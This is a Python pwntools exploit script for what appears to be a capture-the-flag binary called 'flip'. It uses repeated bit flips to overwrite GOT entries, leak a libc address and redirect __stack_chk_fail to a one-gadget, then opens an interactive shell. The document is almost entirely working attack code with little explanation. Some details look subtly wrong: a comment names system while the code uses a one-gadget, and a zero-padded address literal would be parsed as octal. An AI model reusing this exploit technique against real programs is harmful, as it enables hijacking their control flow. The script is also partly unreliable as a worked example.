from pwn import *
#Flip the bits of a next function call, so we get infinite flips
#Flip the address of bss buf to GOT address of time, to get libc leak
#Flip the stack_chk_fail address to system function to get shell.
p = process('./flip')
gdb.attach(p)
p.recvuntil('Enter addr:bit to flip:')
print "Flipping bits of exit to start"
p.sendline('601068:1')
p.sendline('601068:2')
p.sendline('601068:4')
p.sendline('601068:8')

p.recvuntil('Enter addr:bit to flip:')
print "Flipping bits of the variable to system GOT"
print "0x51  to 0x60"
p.sendline('601080:0')
p.sendline('601080:4')
p.sendline('601080:5')
p.sendline('601080:8')
p.recvuntil('Enter addr:bit to flip:')
print "0x0b to 0x10"
p.sendline('601081:0')
p.sendline('601081:1')
p.sendline('601081:3')
p.sendline('601081:4')
p.sendline('601082:5')      #0x40 to 0x60
p.recvuntil("Thank you for flipping us off!\nHave a nice day :)\n")

leak = u64(p.recv(6)+"\x00\x00")
libc = leak - 529136
onegadget = libc + 0x10a38c
stk = libc + 1264768
stk_got = 0000000000601030
log.info("onegadget = " + hex(onegadget))
log.info("stk = " + hex(stk))

#Function to flip
a = bin(stk)[2:]
a = a[::-1]
b = bin(onegadget)[2:]
b = b[::-1]
print a , b
pos = []
for i in range(len(a)):
    if(ord(a[i])^ord(b[i])==1):
        pos.append(i)
print pos

p.recvuntil('Enter addr:bit to flip:')
for j in range(len(pos)):
    print str(pos[j])
    if((j+1)%5 == 0):
        p.sendline(str(stk_got)+":8")
        p.recvuntil('Enter addr:bit to flip:')
    p.sendline(str(stk_got)+":"+str(pos[j]))

p.interactive()
